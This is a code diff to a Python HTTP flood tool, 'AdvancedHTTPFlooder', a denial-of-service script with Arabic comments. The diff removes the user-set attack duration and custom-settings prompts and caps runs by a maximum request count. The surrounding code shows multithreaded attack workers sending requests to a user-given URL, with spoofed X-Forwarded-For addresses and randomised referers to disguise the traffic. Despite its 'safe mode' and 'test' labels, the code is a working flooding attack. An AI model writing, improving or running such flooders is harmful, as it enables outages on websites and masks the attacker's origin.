@@ -28,8 +28,7 @@ class AdvancedHTTPFlooder:
             'REQUEST_TIMEOUT': 4,
             'MAX_REQUESTS': 1500,
             'SAFE_MODE': True,
-            'DYNAMIC_THROTTLING': True,
-            'ATTACK_DURATION': 60  # Default duration in seconds
+            'DYNAMIC_THROTTLING': True
         }
 
         # Libraries initialization
@@ -70,7 +69,7 @@ class AdvancedHTTPFlooder:
                 f"https://www.google.com/search?q={self.generate_random_string()}",
                 f"https://{host}/",
                 f"https://example.com/{self.generate_random_string()}"
-            ])+f"/?q={buildblock(random.randint(3,8))}",
+            ]),
             "X-Forwarded-For": self.fake.ipv4(),
             "X-Request-ID": self.generate_random_string(16),
         }
@@ -156,37 +155,19 @@ class AdvancedHTTPFlooder:
         )
         print(status_msg, end='\r')
 
-    def get_user_settings(self):
-        """Get custom settings from user"""
-        try:
-            # عدد الثريدات
-            threads = int(input(f"{Fore.BLUE}[?] Enter number of threads (default {self.config['MAX_THREADS']}): {Fore.RESET}") or self.config['MAX_THREADS'])
-            if 1 <= threads <= 1000:  # حد أقصى لأغراض السلامة
-                self.config['MAX_THREADS'] = threads
-            
-            # مدة الهجوم
-            duration = int(input(f"{Fore.BLUE}[?] Enter attack duration in seconds (default {self.config['ATTACK_DURATION']}): {Fore.RESET}") or self.config['ATTACK_DURATION'])
-            if duration > 0:
-                self.config['ATTACK_DURATION'] = duration
-                
-        except ValueError:
-            print(f"{Fore.YELLOW}[!] Using default values{Fore.RESET}")
-
     def start_attack(self, target):
         """Start the controlled HTTP flood test"""
         self.display_banner()
-        self.get_user_settings()  # اطلب الإعدادات من المستخدم
 
         if not self.validate_target(target):
             print(f"{Fore.RED}[!] Invalid target URL{Fore.RESET}")
             return
 
         print(f"\n{Fore.YELLOW}[*] Initializing test against: {target}{Fore.RESET}")
-        print(f"{Fore.YELLOW}[*] Settings: {self.config['MAX_THREADS']} threads, {self.config['ATTACK_DURATION']} seconds duration{Fore.RESET}")
+        print(f"{Fore.YELLOW}[*] Safety limits: {self.config['MAX_THREADS']} threads, {self.config['MAX_REQUESTS']} max requests{Fore.RESET}")
 
         self.running = True
         self.start_time = time.time()
-        end_time = self.start_time + self.config['ATTACK_DURATION']
 
         try:
             with concurrent.futures.ThreadPoolExecutor(max_workers=self.config['MAX_THREADS']) as executor:
@@ -196,7 +177,7 @@ class AdvancedHTTPFlooder:
                     futures.append(executor.submit(self.attack_worker, target))
 
                 # Monitor and control
-                while self.running and time.time() < end_time:
+                while self.running and self.counter < self.config['MAX_REQUESTS']:
                     time.sleep(0.5)
                     if self.config['DYNAMIC_THROTTLING']:
                         time.sleep(self.adaptive_delay)
@@ -214,9 +195,7 @@ class AdvancedHTTPFlooder:
 
     def attack_worker(self, target):
         """Worker thread for sending requests"""
-        while (self.running and 
-               self.counter < self.config['MAX_REQUESTS'] and
-               time.time() < self.start_time + self.config['ATTACK_DURATION']):
+        while self.running and self.counter < self.config['MAX_REQUESTS']:
             self.execute_request(target)
             if self.config['DYNAMIC_THROTTLING']:
                 time.sleep(self.adaptive_delay)
@@ -272,15 +251,6 @@ if __name__ == "__main__":
         if target.lower() == 'exit':
             break
         if tester.validate_target(target):
-            # اختيار المستخدم للهجوم الفوري أو المخصص
-            choice = input(f"{Fore.BLUE}[?] Default settings (D) or Custom settings (C)? [D/c]: {Fore.RESET}").strip().lower()
-            if choice == 'c':
-                tester.start_attack(target)
-            else:
-                # تشغيل بالإعدادات الافتراضية
-                tester.config['MAX_THREADS'] = 200  # Reset to default if needed
-                tester.config['ATTACK_DURATION'] = 60
-                tester.start_attack(target)
+            tester.start_attack(target)
             break
-            
         print(f"{Fore.RED}[!] Invalid URL format. Include http:// or https://{Fore.RESET}")
